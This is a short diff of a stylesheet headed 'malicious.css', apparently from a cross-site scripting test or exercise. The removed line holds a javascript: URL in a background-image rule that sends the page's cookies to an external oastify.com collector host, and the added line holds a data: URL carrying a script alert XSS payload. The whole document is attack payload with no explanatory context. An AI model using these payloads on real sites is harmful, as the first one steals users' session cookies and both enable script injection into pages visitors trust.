@@ -1,3 +1,5 @@
+/* malicious.css */
+
 body {
-  background-image: url("javascript:eval('var img = document.createElement(\'img\'); img.src = \'https://wqq6ji4rw2tx5zsnnd0tsgtae1ks8xwm.oastify.com/steal_cookies?cookie=\' + encodeURIComponent(document.cookie);')");
+  background-image: url("data:text/html,<script>alert('XSS')</script>");
 }
